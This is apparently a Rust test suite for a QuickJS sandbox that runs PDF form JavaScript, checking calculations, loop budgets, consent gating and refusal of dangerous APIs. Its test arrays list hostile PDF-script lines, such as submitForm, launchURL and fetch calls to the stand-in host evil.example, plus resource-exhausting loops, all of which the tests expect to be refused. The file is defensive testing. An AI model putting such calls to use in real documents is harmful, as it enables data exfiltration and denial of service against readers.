#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! SL-5.JS.01/02/03 DoD — native (QuickJS) slice.
//!
//! Every claim here is an executed assertion, not a description of intent.

use selis_error::Code;
use selis_pdf_js::{EventKind, Field, JsBudget, JsRequest, JsSandbox};
use selis_policy::{
    ApprovedOrigins, ConsentPolicy, ConsentScope, DocumentIdentity, ScriptAuthorization,
};

fn calc(script: &str) -> JsRequest {
    JsRequest {
        script: script.to_string(),
        event: EventKind::Calculate,
        target: "Total".to_string(),
        fields: vec![
            Field {
                name: "Subtotal".to_string(),
                value: "100".to_string(),
            },
            Field {
                name: "TaxRate".to_string(),
                value: "0.08".to_string(),
            },
            Field {
                name: "Total".to_string(),
                value: "0".to_string(),
            },
        ],
    }
}

fn sandbox() -> JsSandbox {
    JsSandbox::new().expect("native QuickJS runtime")
}

/// (a) A real-world-style tax-form calculation computes a field value.
#[test]
fn calculation_script_computes_a_field_value() {
    let mut sandbox = sandbox();
    let request = calc(
        "var sub = Number(this.getField('Subtotal').value); \
         var rate = Number(this.getField('TaxRate').value); \
         event.value = (sub + sub * rate).toFixed(2);",
    );
    let outcome = sandbox
        .run(request, JsBudget::conservative())
        .expect("calculation script must run");
    assert_eq!(outcome.event_value.as_deref(), Some("108.00"));
    assert!(outcome.event_rc);
    assert!(
        outcome.updates.is_empty(),
        "the script only set event.value"
    );
}

/// A format script using the whitelisted `util.printf` and `AF*` helpers runs.
#[test]
fn format_script_uses_whitelisted_helpers() {
    let mut sandbox = sandbox();
    let request = JsRequest {
        script: "AFNumber_Format(2, 0, 0, 0, '', true); \
                 event.value = util.printf('%.2f', Number(this.getField('Subtotal').value));"
            .to_string(),
        event: EventKind::Format,
        target: "Subtotal".to_string(),
        fields: vec![Field {
            name: "Subtotal".to_string(),
            value: "12.5".to_string(),
        }],
    };
    let outcome = sandbox
        .run(request, JsBudget::conservative())
        .expect("format script must run");
    assert_eq!(outcome.event_value.as_deref(), Some("12.50"));
}

/// A field written through `this.getField(name).value` is returned as an update.
#[test]
fn script_field_write_is_reported_to_the_caller() {
    let mut sandbox = sandbox();
    let request = calc("this.getField('Total').value = 'done'; event.value = 'done';");
    let outcome = sandbox
        .run(request, JsBudget::conservative())
        .expect("script must run");
    assert!(
        outcome
            .updates
            .iter()
            .any(|u| u.name == "Total" && u.value == "done"),
        "field write must be reported: {:?}",
        outcome.updates
    );
}

/// (b) An infinite loop is interrupted by the instruction budget.
#[test]
fn infinite_loop_is_interrupted() {
    let mut sandbox = sandbox();
    let request = calc("while (true) { }");
    let error = sandbox
        .run(request, JsBudget::tiny())
        .expect_err("infinite loop must not succeed");
    assert_eq!(error.code(), Code::JsInstructionBudget);
}

/// A `for(;;)` loop is also interrupted — a different loop shape, same bound.
#[test]
fn for_ever_loop_is_interrupted() {
    let mut sandbox = sandbox();
    let request = calc("for (;;) { var x = 1; }");
    let error = sandbox
        .run(request, JsBudget::tiny())
        .expect_err("infinite loop must not succeed");
    assert_eq!(error.code(), Code::JsInstructionBudget);
}

/// A normal script that uses many ticks still succeeds under the tiny budget.
#[test]
fn bounded_work_succeeds_under_the_tiny_budget() {
    let mut sandbox = sandbox();
    let request =
        calc("var n = 0; for (var i = 0; i < 10; i++) { n += i; } event.value = String(n);");
    let outcome = sandbox
        .run(request, JsBudget::tiny())
        .expect("bounded work");
    assert_eq!(outcome.event_value.as_deref(), Some("45"));
}

/// (c) Forbidden Acrobat APIs are refused with a typed policy error.
#[test]
fn dangerous_apis_are_refused() {
    let scripts = [
        "app.launchURL('https://evil.example')",
        "this.submitForm({cURL: 'https://evil.example'})",
        "this.exportDataObject({n: 'secret', d: true})",
        "Net.HTTP.request({url: 'https://evil.example'})",
        "Collab.getIcon('x')",
        "fetch('https://evil.example')",
    ];
    for script in scripts {
        let mut sandbox = sandbox();
        let error = sandbox
            .run(calc(script), JsBudget::conservative())
            .expect_err("{script} must be refused");
        assert_eq!(error.code(), Code::JsApiRefused, "{script}");
    }
}

/// The APIs are genuinely absent, not merely caught by the static scan: a name
/// assembled at runtime resolves to `undefined` rather than a host capability.
#[test]
fn dangerous_apis_are_absent_at_runtime() {
    let mut sandbox = sandbox();
    let request = calc(
        "var k = String.fromCharCode(97, 112, 112); \
         event.value = typeof this[k];",
    );
    let outcome = sandbox
        .run(request, JsBudget::conservative())
        .expect("this must not throw: the API is simply absent");
    assert_eq!(outcome.event_value.as_deref(), Some("undefined"));
}

/// (d) A script never runs without per-document reader consent.
#[test]
fn scripts_do_not_run_without_consent() {
    let mut sandbox = sandbox();
    let consent = ConsentPolicy::new();
    let origins = ApprovedOrigins::new();
    let gate = ScriptAuthorization::new(&consent, &origins);
    let doc = DocumentIdentity::new("tax-form-2026", "local");

    let denied = sandbox
        .run_authorized(
            calc("event.value = 'RAN';"),
            JsBudget::conservative(),
            &gate,
            &doc,
        )
        .expect_err("default deny");
    assert_eq!(denied.code(), Code::JsConsentRequired);

    // Explicit reader consent for THIS document allows it.
    let mut consent = ConsentPolicy::new();
    consent.grant(&doc, ConsentScope::Session);
    let gate = ScriptAuthorization::new(&consent, &origins);
    let outcome = sandbox
        .run_authorized(
            calc("event.value = 'RAN';"),
            JsBudget::conservative(),
            &gate,
            &doc,
        )
        .expect("consented run");
    assert_eq!(outcome.event_value.as_deref(), Some("RAN"));
}

/// Admin origin pre-approval is the explicit ADR-P0020 exception.
#[test]
fn admin_origin_can_preapprove_auto_run() {
    let mut sandbox = sandbox();
    let consent = ConsentPolicy::new();
    let mut origins = ApprovedOrigins::new();
    origins.approve_origin("https://forms.example");
    let gate = ScriptAuthorization::new(&consent, &origins);
    let doc = DocumentIdentity::new("tax-form-2026", "https://forms.example");
    let outcome = sandbox
        .run_authorized(
            calc("event.value = 'AUTO';"),
            JsBudget::conservative(),
            &gate,
            &doc,
        )
        .expect("admin-approved run");
    assert_eq!(outcome.event_value.as_deref(), Some("AUTO"));
}

/// SL-5.JS.03: an explicit reader decline is absolute. Even an admin
/// allow-list that covers this exact origin and id cannot re-enable the
/// document, and the interpreter is never reached.
#[test]
fn a_reader_decline_is_never_overridden_by_admin_approval() {
    let mut sandbox = sandbox();
    let doc = DocumentIdentity::new("tax-form-2026", "https://forms.example");
    let mut consent = ConsentPolicy::new();
    consent.grant(&doc, ConsentScope::Session);
    consent.decline(&doc);
    let mut origins = ApprovedOrigins::new();
    origins.approve_origin("https://forms.example");
    origins.approve_document("tax-form-2026");
    let gate = ScriptAuthorization::new(&consent, &origins);

    let denied = sandbox
        .run_authorized(
            calc("event.value = 'RAN';"),
            JsBudget::conservative(),
            &gate,
            &doc,
        )
        .expect_err("decline is absolute");
    assert_eq!(denied.code(), Code::JsDeclined);
}

/// (e) A malicious-script corpus is contained: every sample either is refused
/// before evaluation or is interrupted/contained by the engine. None escapes.
#[test]
fn malicious_script_corpus_is_contained() {
    let corpus = [
        "while (true) {}",
        "for (;;) { var x = 1; }",
        "var a = []; while (true) { a.push('x'); }",
        "function f() { return f(); } f();",
        "app.launchURL('https://evil.example')",
        "this.submitForm({cURL: 'https://evil.example'})",
        "this.exportDataObject({n: 'x', d: true})",
        "Net.HTTP.request({url: 'https://evil.example'})",
        "Collab.getIcon('x')",
        "fetch('https://evil.example')",
        "require('fs')",
        "WebAssembly.compile(new Uint8Array())",
        "var s = 'x'; for (;;) { s += s; }",
    ];
    for script in corpus {
        let mut sandbox = sandbox();
        let result = sandbox.run(calc(script), JsBudget::tiny());
        assert!(
            result.is_err(),
            "malicious script was not contained: {script}"
        );
    }
}

/// Malformed input is rejected before the engine sees it.
#[test]
fn malformed_input_is_rejected() {
    let mut sandbox = sandbox();
    let mut request = calc("event.value = 'x';");
    request.script.clear();
    let error = sandbox
        .run(request, JsBudget::conservative())
        .expect_err("empty script");
    assert_eq!(error.code(), Code::JsScriptRejected);

    let mut request = calc("event.value = 'x';");
    request.script.push('\0');
    let error = sandbox
        .run(request, JsBudget::conservative())
        .expect_err("NUL in script");
    assert_eq!(error.code(), Code::JsScriptRejected);
}
